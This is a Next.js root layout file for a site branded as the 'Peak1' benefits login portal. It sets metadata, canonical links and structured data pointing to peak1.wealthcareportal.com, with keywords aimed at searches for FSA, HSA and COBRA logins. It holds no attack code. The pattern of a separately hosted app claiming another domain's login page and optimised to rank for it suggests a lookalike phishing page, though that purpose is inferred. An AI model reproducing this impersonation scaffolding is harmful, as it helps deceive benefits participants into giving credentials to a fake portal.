import type React from "react";
import type { Metadata } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://peak1.wealthcareportal.com/Authentication/Handshake";
const SITE_DOMAIN = "peak1.wealthcareportal.com";
const SITE_BRAND = "Peak1";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "Peak1 - Login",
    template: "%s | Peak1",
  },
  keywords: [
    "Peak1",
    "peak1",
    "peak1.wealthcareportal.com",
    "benefits login",
    "employee benefits portal",
    "FSA login",
    "HSA login",
    "COBRA login",
    "account access",
    "health benefits",
    "dependent care",
    "reimbursement account",
    "secure login",
    "participant portal",
    "employer portal",
    "handshake authentication",
  ],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Peak1.`,

  authors: [{ name: "Peak1" }],
  creator: "Peak1",
  publisher: "Peak1",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "Peak1 - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Peak1.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "Peak1 - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Peak1.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon.ico",
    shortcut: "/favicon.ico",
    apple: "/favicon.ico",
  },
  viewport: {
    width: "device-width",
    initialScale: 1,
    maximumScale: 5,
  },
  themeColor: "#254650",
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "Peak1 sign in portal. Log in to manage your health and dependent care benefits and access your Peak1 profile.",
  publisher: {
    "@type": "Organization",
    name: SITE_BRAND,
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
